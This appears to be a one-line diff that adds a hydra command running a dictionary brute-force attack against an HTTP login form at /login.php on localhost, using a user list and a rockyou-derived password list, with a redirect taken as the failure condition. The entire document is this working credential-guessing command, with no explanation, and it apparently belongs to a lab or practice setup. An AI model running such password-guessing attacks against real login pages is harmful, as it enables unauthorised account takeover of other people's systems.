@@ -1,0 +1,1 @@
+hydra -L users.txt -P smallrockyou.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=302"
